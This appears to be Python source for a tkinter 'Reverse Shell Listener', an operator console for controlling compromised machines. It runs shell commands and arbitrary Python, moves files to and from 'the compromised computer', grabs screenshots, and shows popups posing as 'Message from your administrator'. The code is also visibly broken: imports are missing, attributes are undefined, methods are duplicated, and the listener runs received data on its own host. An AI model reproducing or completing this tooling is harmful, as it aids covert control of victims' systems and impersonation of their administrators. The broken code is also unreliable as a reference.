import socket
import threading
import os
import subprocess
import base64
import webbrowser
import tkinter as tk
import tkinter.filedialog as filedialog
from PIL import ImageGrab

class ListenerGUI:
	def __init__(self, master):
		self.master = master
		master.title("Reverse Shell Listener")


		# Create a menu bar
		menu_bar = tk.Menu(master)
		master.config(menu=menu_bar)

		# Create a TK menu
		TK_menu = tk.Menu(menu_bar, tearoff=0)
		TK_menu.add_command(label="Exit", command=master.quit)
		menu_bar.add_cascade(label="TK", menu=TK_menu)

		# Create a tools menu
		tools_menu = tk.Menu(menu_bar, tearoff=0)
		tools_menu.add_command(label="List Executables", command=self.list_executables)
		tools_menu.add_command(label="System Info", command=self.show_system_info)
		tools_menu.add_command(label="Capture Screenshot", command=self.capture_screenshot)
		menu_bar.add_cascade(label="Tools", menu=tools_menu)

		# Create a files menu
		file_menu = tk.Menu(menu_bar, tearoff=0)
		file_menu.add_command(label="Upload File", command=self.upload_file)
		file_menu.add_command(label="Download File", command=self.download_file)
		menu_bar.add_cascade(label="File", menu=file_menu)
		
		# Create the input fields and buttons
		self.host_label = tk.Label(master, text="Host:")
		self.host_label.grid(row=0, column=0)
		self.host_entry = tk.Entry(master)
		self.host_entry.grid(row=0, column=1)
		self.port_label = tk.Label(master, text="Port:")
		self.port_label.grid(row=1, column=0)
		self.port_entry = tk.Entry(master)
		self.port_entry.grid(row=1, column=1)
		self.start_button = tk.Button(master, text="Start", command=self.start_listener)
		self.start_button.grid(row=2, column=0)
		self.stop_button = tk.Button(master, text="Stop", command=self.stop_listener, state="disabled")
		self.stop_button.grid(row=2, column=1)

		# Create the command input field and button
		self.command_label = tk.Label(master, text="Command:")
		self.command_label.grid(row=3, column=0)
		self.command_entry = tk.Entry(master)
		self.command_entry.grid(row=3, column=1)
		self.execute_button = tk.Button(master, text="Execute", command=self.execute_command, state="disabled")
		self.execute_button.grid(row=4, column=0, columnspan=2)

		# Create the button to open a link
		self.link_label = tk.Label(master, text="Link:")
		self.link_label.grid(row=9, column=0)
		self.link_entry = tk.Entry(master)
		self.link_entry.grid(row=9, column=1)
		self.link_button = tk.Button(master, text="Open Link", command=self.open_link)
		self.link_button.grid(row=10, column=0, columnspan=2)
		self.clear_link_button = tk.Button(master, text="Clear Link", command=self.clear_link)
		self.clear_link_button.grid(row=10, column=1)

#		# Create the kill process entry field and label
#		self.kill_process_label = tk.Label(master, text="Enter process ID to kill:")
#		self.kill_process_label.grid(row=16, column=0)
#		self.kill_process_entry = tk.Entry(master)
#		self.kill_process_entry.grid(row=16, column=1)

		# Create the console output
		self.console = tk.Text(master)
		self.console.grid(row=17, column=0, columnspan=2)
		self.clear_console_button = tk.Button(master, text="Clear Console", command=self.clear_console)
		self.clear_console_button.grid(row=18, column=2, columnspan=2)

		# Create the message input field and send button
		self.message_label = tk.Label(master, text="Message:")
		self.message_label.grid(row=5, column=0)
		self.entry_message = tk.Entry(master)
		self.entry_message.grid(row=5, column=1)
		self.send_message = tk.Button(master, text="Send Message", command=self.send_message)
		self.send_message.grid(row=6, column=0, columnspan=2)
		self.clear_message_button = tk.Button(master, text="Clear Message", command=self.clear_link)
		self.clear_message_button.grid(row=6, column=1)

		# Create the message input field and send button
		self.python_label = tk.Label(master, text="Python Code :")
		self.python_label.grid(row=7, column=0)
		self.entry_message_1 = tk.Entry(master)
		self.entry_message_1.grid(row=7, column=1)
		self.py_send_message = tk.Button(master, text="Execute Code", command=self.send_message)
		self.py_send_message.grid(row=8, column=0, columnspan=2)

		# Set up event listener for the message input field
		self.entry_message.bind("<KeyRelease>", self.check_message_entry)

		# Set up event listener for the message input field
		self.entry_message_1.bind("<KeyRelease>", self.check_message_entry)


	def clear_link(self):
		# clear the link text box
		self.link_entry.delete(0, tk.END)
	
	def clear_console(self):
		self.console.delete("1.0", tk.END)
	
	def check_message_entry(self, event):
		# Enable the send_message button if entry_message has text
		if len(self.link_entry.get()) > 0:
			self.link_button.config(state="normal")
		else:
			self.link_button.config(state="disabled")

	def check_message_entry_1(self, event):
		# Enable the send_message button if entry_message has text
		if len(self.link_entry.get()) > 0:
			self.clear_link_button.config(state="normal")
		else:
			self.clear_link_button.config(state="disabled")

	def check_message_entry_2(self, event):
		# Enable the send_message button if entry_message has text
		if len(self.console.get()) > 0:
			self.clear_console_button.config(state="normal")
		else:
			self.clear_console_button.config(state="disabled")

	def check_message_entry_3(self, event):
		# Enable the send_message button if entry_message has text
		if len(self.entry_message.get()) > 0:
			self.send_message.config(state="normal")
		else:
			self.send_message.config(state="disabled")

	def check_message_entry_3(self, event):
		# Enable the send_message button if entry_message has text
		if len(self.entry_message_1.get()) > 0:
			self.py_send_message.config(state="normal")
		else:
			self.py_send_message.config(state="disabled")

	def check_message_entry_5(self, event):
		# Enable the send_message button if entry_message has text
		if len(self.app_name_entry.get()) > 0:
			self.start_app_radio.config(state="normal")
		else:
			self.start_app_radio.config(state="disabled")

	def check_message_entry_5(self, event):
		# Enable the send_message button if entry_message has text
		if len(self.app_name_entry.get()) > 0:
			self.stop_app_radio.config(state="normal")
		else:
			self.stop_app_radio.config(state="disabled")

	def check_message_entry_6(self, event):
		# Enable the send_message button if entry_message has text
		if len(self.app_name_entry.get()) > 0:
			self.start_app_button.config(state="normal")
		else:
			self.start_app_button.config(state="disabled")

	def check_message_entry_7(self, event):
		# Enable the send_message button if entry_message has text
		if len(self.app_name_entry.get()) > 0:
			self.stop_app_button.config(state="normal")
		else:
			self.stop_app_button.config(state="disabled")

	def check_message_entry_7(self, event):
		# Enable the send_message button if entry_message has text
		if len(self.console.get()) > 0:
			self.clear_console_button.config(state="normal")
		else:
			self.clear_console_button.config(state="disabled")

	def send_message(self):
		# Get the message from the input field
		message = self.entry_message.get()

		# Create a .vbs file to display the message
		script = 'Set wshShell = CreateObject("WScript.Shell")\n'
		script += f'wshShell.Popup "{message}",0,"Message from your administrator",64\n'
		with open('message.vbs', 'w') as f:
			f.write(script)

		# Execute the .vbs file to display the message
		subprocess.Popen('message.vbs', shell=True)

	def run_python(self):
		"""
		This function executes the Python code entered in the entry box
		"""
		code = self.entry_message_1.get()
		try:
			exec(code)
		except Exception as e:
			messagebox.showerror("Error", e)

	def start_listener(self):
		# Get the host and port from the input fields
		host = self.host_entry.get()
		port_str = self.port_entry.get()
	
		if not port_str:
			self.console.insert(tk.END, 'Please enter a port number\n')
			return
	
		port = int(port_str)

		# Create a socket object
		self.s = socket.socket()

		# Bind the socket to a specific IP address and port number
		self.s.bind((host, port))

		# Listen for incoming connections
		self.s.listen(1)
		self.console.insert(tk.END, f'Listening on {host}:{port}...\n')

		# Enable the stop button and disable the start button
		self.stop_button.config(state="normal")
		self.start_button.config(state="disabled")

		# Accept the connection from the reverse shell
		self.conn, self.addr = self.s.accept()
		self.console.insert(tk.END, f'Connected by {self.addr}\n')

		# Enable the execute button
		self.execute_button.config(state="normal")

		# Receive the output from the reverse shell and execute commands
		while True:
			data = self.conn.recv(1024)
			if not data:
				break
			output = subprocess.check_output(data.decode('utf-8'), shell=True)
			self.conn.send(output)
			self.console.insert(tk.END, output.decode('utf-8'))

	def stop_listener(self):
		# Close the connection and the socket
		self.conn.close()
		self.s.close()
		self.console.insert(tk.END, f'Connection closed by {self.addr}\n')

		# Disable the stop button and enable the start button
		self.stop_button.config(state="disabled")
		self.start_button.config(state="normal")

		# Disable the execute button
		self.execute_button.config(state="disabled")

	def execute_command(self):
		# Get the command from the input field
		command = self.command_entry.get()

		# Execute the command and display the output
		output = subprocess.check_output(command, shell=True)
		self.console.insert(tk.END, output.decode('utf-8'))
		self.command_entry.delete(0, tk.END)

	def open_link(self):
		# Get the URL from the input field
		url = self.link_entry.get()

		# Open the URL in the default web browser
		webbrowser.open(url)

	def app_control(self):
		# Get the application name from the input field
		app_name = self.app_name_entry.get()

		# Get the action from the selected radio button
		action = self.app_action.get()

		# Execute the appropriate command based on the selected action
		if action == "start":
			subprocess.Popen(["start", app_name], shell=True)
			self.console_output.insert(tk.END, f"[+] Starting {app_name}...\n")
		elif action == "stop":
			subprocess.Popen(["taskkill", "/F", "/IM", app_name], shell=True)
			self.console_output.insert(tk.END, f"[+] Stopping {app_name}...\n")

	def launch_app_command(self):
		app_name = self.launch_entry.get()
		output = self.shell.send_command("launch_app %s" % app_name)
		self.append_console(output)

	def list_executables(self):
		# Get a list of files in the current directory
		files = os.listdir()

		# Filter out the executable files
		executables = [f for f in files if os.path.isfile(f) and os.access(f, os.X_OK)]

		# Create a new window for the menu
		menu_window = tk.Toplevel(self.master)
		menu_window.title("Executable Files")

		# Create a label for the menu
		label = tk.Label(menu_window, text="Select an executable file:")
		label.pack()

		# Create a button for each executable file
		for exe in executables:
			button = tk.Button(menu_window, text=exe, command=lambda exe=exe: self.execute_file(exe))
			button.pack()

	def execute_file(self, exe):
		# Execute the selected file
		subprocess.Popen(exe)
	
	def show_system_info(self):
		# get system information
		system = platform.system()
		node = platform.node()
		release = platform.release()
		version = platform.version()
		machine = platform.machine()
		processor = platform.processor()

		# create new window for system information
		system_info_window = tk.Toplevel(self.master)
		system_info_window.title("System Information")

		# create labels to display system information
		tk.Label(system_info_window, text="System: " + system).pack()
		tk.Label(system_info_window, text="Node: " + node).pack()
		tk.Label(system_info_window, text="Release: " + release).pack()
		tk.Label(system_info_window, text="Version: " + version).pack()
		tk.Label(system_info_window, text="Machine: " + machine).pack()
		tk.Label(system_info_window, text="Processor: " + processor).pack()

	def capture_screenshot(self):
		img = ImageGrab.grab()
		img_bytes = base64.b64encode(img.tobytes())
		subprocess.Popen(f"echo {img_bytes.decode()} | base64 -d > screenshot.png", shell=True)

	def upload_file(self):
		# Open a file dialog to choose a file to upload
		file_path = filedialog.askopenfilename(initialdir=".", title="Select File")

		# Send the file to the compromised computer
		os.system(f"certutil.exe -encode \"{file_path}\" - | powershell.exe -c \"$b=Get-Content -Encoding Byte;" +
				  f" [System.IO.File]::WriteAllBytes('{os.path.basename(file_path)}', $b[0..$b.length-1])\"")
		self.add_to_console(f"Uploaded file: {os.path.basename(file_path)}")

	def download_file(self):
		# Get the filename to download
		filename = self.get_file_name()

		# Download the file from the compromised computer
		os.system(f"powershell.exe -c \"Get-Content '{filename}' -Encoding Byte -ReadCount 0 |" +
				  "ForEach-Object {$_.trim()} | Set-Content -Encoding Byte -NoNewline -Force -Path -\" > " +
				  f"{filename}")
		self.add_to_console(f"Downloaded file: {filename}")

	def get_file_name(self):
		file_choices = (("All Files", "*.*"),)
		filename = filedialog.askopenfilename(title="Select File to Download", filetypes=file_choices)
		return filename

	def add_to_console(self, text):
		# Add text to the console
		self.console_output.config(state="normal")
		self.console_output.insert(tk.END, text + "\n")
		self.console_output.config(state="disabled")
	
	def send_chat(self):
		# Get the chat message from the input field
		message = self.chat_entry.get()

		# Send the message to the client
		client_socket.sendall(message.encode())

		# Add the message to the chat history
		self.chat_history.insert(tk.END, f"You: {message}\n")
		self.chat_entry.delete(0, tk.END)

	def listen_for_chat_messages(self):
		while True:
			conn, addr = self.chat_socket.accept()
			with conn:
				while True:
					data = conn.recv(1024)
					if not data:
						break
					message = data.decode()
					self.chat_history.insert(tk.END, f"Client: {message}\n")

	def start_listene(self):
		# Get the port number from the input field
		port = self.port_entry.get()

		# Start the listener
		try:
			subprocess.Popen(["python", "listener.py", port])
		except Exception as e:
			self.console_output.insert(tk.END, str(e) + "\n")

	def list_processes(self):
		# List all running processes
		try:
			process_list = subprocess.check_output(["tasklist"]).decode('utf-8')
			self.console_output.insert(tk.END, process_list + "\n")
		except Exception as e:
			self.console_output.insert(tk.END, str(e) + "\n")

	def kill_process(self):
		# Get the process ID from the input field
		process_id = self.kill_process_entry.get()

		# Kill the process
		try:
			subprocess.check_call(["taskkill", "/F", "/PID", process_id])
		except Exception as e:
			self.console_output.insert(tk.END, str(e) + "\n")

if __name__ == '__main__':
	root = tk.Tk()
	gui = ListenerGUI(root)
	root.mainloop()
